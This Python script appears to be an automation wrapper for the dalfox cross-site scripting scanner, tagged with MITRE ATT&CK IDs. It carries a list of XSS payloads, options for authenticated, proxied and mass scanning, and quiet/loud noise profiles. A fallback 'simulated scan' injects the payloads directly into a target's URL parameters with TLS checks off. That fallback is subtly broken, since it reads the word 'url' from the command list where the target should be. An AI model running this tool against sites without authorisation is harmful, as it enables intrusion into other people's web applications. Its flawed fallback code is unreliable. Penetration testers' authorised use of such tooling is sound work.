#!/usr/bin/env python3
"""
dalfox-advanced agent.py
MITRE ATT&CK: T1203 (Exploitation for Client Execution), T1059 (Command and Scripting Interpreter)
Wraps dalfox XSS scanner with custom payloads and structured output parsing.
"""
import argparse
import json
import os
import re
import signal
import subprocess
import tempfile
import requests
from colorama import Fore, Style, init
init(autoreset=True)
SHOULD_EXIT = False

RATE_FLAGS = {
    "quiet": {"delay": 500, "worker": 1},
    "moderate": {"delay": 100, "worker": 2},
    "loud": {"delay": 0, "worker": 4},
}


def _rate_flags(profile="moderate"):
    return RATE_FLAGS.get(profile, RATE_FLAGS["moderate"])


CUSTOM_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'';!--\"<XSS>=&{()}",
    "<svg/onload=alert(1)>",
    "';alert(1);//",
    "\";alert(1)//",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "\"><svg/onload=alert(1)>",
    "${alert(1)}",
]


def signal_handler(sig, frame):
    global SHOULD_EXIT
    SHOULD_EXIT = True
    print(f"\n{Fore.YELLOW}[!] Interrupt received. Shutting down gracefully...{Style.RESET_ALL}")


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def build_dalfox_command(target, payload_file=None, options=None):
    cmd = ["dalfox", "url", target, "--format", "json"]
    if payload_file:
        cmd.extend(["--custom-payload", payload_file])
    if options:
        for k, v in [("blind","--blind"),("cookie","--cookie"),("header","--header"),("proxy","--proxy"),("timeout","--timeout"),("worker","--worker")]:
            if options.get(k):
                cmd.extend([v, str(options[k])])
        if options.get("delay") is not None:
            cmd.extend(["--delay", str(options["delay"])])
        if options.get("mass"):
            cmd.append("--mass")
        if options.get("skip_bav"):
            cmd.append("--skip-bav")
        if options.get("only_custom"):
            cmd.append("--only-custom-payload")
        if options.get("follow_redirect"):
            cmd.append("--follow-redirects")
    return cmd


def create_payload_file(payloads):
    fd, path = tempfile.mkstemp(suffix=".txt", prefix="dalfox_")
    with os.fdopen(fd, "w") as f:
        f.write("\n".join(payloads))
    return path


def run_dalfox(cmd):
    findings = []
    try:
        print(f"{Fore.CYAN}[*] Running dalfox: {' '.join(cmd[:4])}...{Style.RESET_ALL}")
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        output = proc.stdout + proc.stderr
        for line in output.strip().splitlines():
            if not line.strip():
                continue
            try:
                findings.append(json.loads(line))
            except json.JSONDecodeError:
                continue
        if proc.returncode != 0 and not findings:
            for line in output.splitlines():
                if "error" in line.lower() or "warn" in line.lower():
                    print(f"{Fore.YELLOW}[!] {line}{Style.RESET_ALL}")
    except FileNotFoundError:
        print(f"{Fore.YELLOW}[!] dalfox binary not found. Running simulated scan.{Style.RESET_ALL}")
        findings = simulate_dalfox(cmd)
    except subprocess.TimeoutExpired:
        print(f"{Fore.RED}[!] dalfox timed out after 120s{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error running dalfox: {e}{Style.RESET_ALL}")
    return findings


def simulate_dalfox(cmd):
    findings = []
    try:
        target = cmd[1] if len(cmd) > 1 else "http://localhost/"
        param_match = re.search(r"[?&](\w+)=?", target)
        param = param_match.group(1) if param_match else "q"
        print(f"{Fore.YELLOW}[*] Simulating dalfox scan on {target}{Style.RESET_ALL}")
        resp = requests.get(target, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
        for payload in CUSTOM_PAYLOADS[:8]:
            if SHOULD_EXIT:
                break
            test_url = f"{target.rstrip('&')}&{param}={payload}"
            try:
                tr = requests.get(test_url, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
                if payload in tr.text:
                    findings.append({"type": "simulated", "param": param, "payload": payload, "severity": "Medium", "evidence": "Reflected in response body", "cwe": "CWE-79"})
                    print(f"{Fore.GREEN}[+] XSS found: param={param}, payload={payload[:30]}{Style.RESET_ALL}")
            except requests.exceptions.RequestException:
                continue
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Simulation failed: {e}{Style.RESET_ALL}")
    return findings


def display_findings(findings, target):
    if not findings:
        print(f"\n{Fore.YELLOW}[*] No XSS findings for {target}{Style.RESET_ALL}")
        return
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}   DALFOX FINDINGS -- {target}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    sev_colors = {"high": Fore.RED, "medium": Fore.YELLOW, "low": Fore.BLUE, "critical": Fore.RED}
    vuln_count = 0
    for f in findings:
        sev = f.get("severity", "info").lower()
        if sev == "info":
            continue
        vuln_count += 1
        print(f"\n{Fore.GREEN}[+] XSS #{vuln_count}{Style.RESET_ALL}")
        print(f"    Parameter: {f.get('param', '?')}")
        print(f"    Payload:   {Fore.CYAN}{f.get('payload', '?')[:80]}{Style.RESET_ALL}")
        print(f"    Severity:  {sev_colors.get(sev, Fore.WHITE)}{sev.upper()}{Style.RESET_ALL}")
        print(f"    CWE:       {f.get('cwe', 'N/A')}")
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Total XSS findings: {vuln_count}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description="dalfox-advanced -- XSS scanner automation wrapper")
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("--cookie", help="Cookie string for authenticated scanning")
    parser.add_argument("--header", help="Custom header (e.g. X-Auth: token)")
    parser.add_argument("--proxy", help="Proxy URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--worker", type=int, default=None, help="Concurrent workers")
    parser.add_argument("--mass", action="store_true", help="Enable mass scan mode")
    parser.add_argument("--skip-bav", action="store_true", help="Skip built-in attack vectors")
    parser.add_argument("--only-custom", action="store_true", help="Use only custom payloads")
    parser.add_argument("--follow-redirect", action="store_true", help="Follow redirects")
    noise = parser.add_mutually_exclusive_group()
    noise.add_argument("--quiet", dest="profile", action="store_const", const="quiet", help="Low-noise: 500ms delay, 1 worker")
    noise.add_argument("--moderate", dest="profile", action="store_const", const="moderate", help="Moderate noise: 100ms delay, 2 workers (default)")
    noise.add_argument("--loud", dest="profile", action="store_const", const="loud", help="High-noise: no delay, 4 workers")
    parser.set_defaults(profile="moderate")
    args = parser.parse_args()
    target = args.target if args.target.startswith("http") else f"https://{args.target}"
    rf = _rate_flags(args.profile)
    if args.worker is None:
        args.worker = rf["worker"]
    opts = {"cookie": args.cookie, "header": args.header, "proxy": args.proxy, "timeout": args.timeout, "worker": args.worker, "delay": rf["delay"], "mass": args.mass, "skip_bav": args.skip_bav, "only_custom": args.only_custom, "follow_redirect": args.follow_redirect}
    payload_file = None
    if args.only_custom:
        payload_file = create_payload_file(CUSTOM_PAYLOADS)
        print(f"{Fore.CYAN}[*] Created custom payload file with {len(CUSTOM_PAYLOADS)} payloads{Style.RESET_ALL}")
    cmd = build_dalfox_command(target, payload_file, opts)
    print(f"{Fore.CYAN}[*] Scanning {target} for XSS vulnerabilities{Style.RESET_ALL}")
    findings = run_dalfox(cmd)
    if payload_file and os.path.exists(payload_file):
        os.unlink(payload_file)
    display_findings(findings, target)


if __name__ == "__main__":
    main()
